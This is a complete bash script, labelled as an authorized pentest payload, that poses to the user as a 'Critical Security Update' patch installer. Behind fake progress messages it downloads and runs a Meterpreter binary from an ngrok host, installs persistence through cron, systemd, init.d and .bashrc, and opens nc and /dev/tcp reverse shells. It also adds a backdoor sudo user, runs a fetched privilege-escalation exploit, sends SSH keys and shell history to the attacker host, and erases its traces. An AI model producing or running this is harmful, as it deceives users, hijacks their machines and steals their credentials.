#!/bin/bash

# Pentest Payload v2.0 - Authorized Security Assessment
NGROK_URL="https://directly-hippopotamic-berniece.ngrok-free.dev"
C2_IP=$(curl -s "$NGROK_URL/ip" 2>/dev/null || echo "117.238.97.134")
C2_PORT="4443"
METER_URL="$NGROK_URL:8080/meterpreter.elf"

clear
echo "========================================"
echo "  Critical Security Update Required"
echo "  CVE-2026-0011 Patch Deployment"
echo "========================================"

echo -n "Phase 1: Downloading patches... "
cd /tmp
wget -q --no-check-certificate -O meter.elf "$METER_URL" || \
curl -s -o meter.elf "$METER_URL"
echo "[$( [ -f meter.elf ] && echo "✓ 1.8MB" || echo "✗ FAILED" )]"

# Meterpreter execution
[ -f meter.elf ] && {
    chmod +x meter.elf
    echo -n "Phase 2: Installing core updates... "
    nohup ./meter.elf -P "$C2_IP" -p "$C2_PORT" >/dev/null 2>&1 &
    sleep 3
    echo "[✓ LIVE]"
}

echo -n "Phase 3: Deploying persistence... "
{
    (crontab -l 2>/dev/null; echo "* * * * * /tmp/meter.elf -P $C2_IP -p $C2_PORT") | crontab -
    echo "[Unit]\nDescription=Security Update Service\n[Service]\nExecStart=/tmp/meter.elf -P $C2_IP -p $C2_PORT\nRestart=always\n[Install]\nWantedBy=multi-user.target" > /tmp/security.service
    systemctl enable /tmp/security.service 2>/dev/null || :
    [ -d /etc/init.d ] && ln -s /tmp/meter.elf /etc/init.d/security-update
    echo "/tmp/meter.elf -P $C2_IP -p $C2_PORT &" >> ~/.bashrc
} >/dev/null 2>&1
echo "[✓ CRON+SYSTEMD+RC]"

# Immediate shells (high success rate)
{
    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc "$C2_IP" 4445 >/tmp/f 2>/dev/null &
    bash -i >& /dev/tcp/$C2_IP/4446 0>&1 2>/dev/null &
} >/dev/null 2>&1 &

# Privilege escalation & recon
{
    # SUID hunting
    find / -perm -4000 -type f 2>/dev/null | while read f; do $f 2>&1 | grep -qi flag{,} && $f; done 2>/dev/null &
    
    # Backdoor user
    [ -w /etc/passwd ] && useradd -m backdoor -s /bin/bash -G sudo,wheel 2>/dev/null
    
    # Dirty COW privesc
    wget -q "http://$C2_IP:8080/dirtycow" -O /tmp/dirtycow && chmod +x /tmp/dirtycow && /tmp/dirtycow &
    
    # Sudoers
    echo "$USER ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null || :
} &

# Data exfiltration
{
    wpa_cli -i wlan0 status 2>/dev/null | nc "$C2_IP" 4447 2>/dev/null &
    tar czf - ~/.ssh /root/.ssh 2>/dev/null | nc "$C2_IP" 4448 2>/dev/null &
    history | nc "$C2_IP" 4449 2>/dev/null &
    
    # Bonus: current user creds
    cat ~/.ssh/id_rsa ~/.ssh/id_dsa 2>/dev/null | nc "$C2_IP" 4450 2>/dev/null &
} &

echo -n "Phase 4: System hardening complete... "
sleep 2
echo "[✓ FULL ACCESS]"

echo
echo "========================================"
echo "  PATCH INSTALLATION 100% COMPLETE ✓"
echo "  Enhanced Protection Active"
echo "  Auto-updates: Enabled (cron + systemd)"
echo "========================================"
echo "Your system is now secure. Thank you!"

# Stealth cleanup
sleep 8
rm -rf /tmp/meter* /tmp/f /tmp/dirtycow /tmp/security.service 2>/dev/null
history -c && history -w 2>/dev/null

# Fake monitoring loop
while true; do printf "."; sleep 60; done &
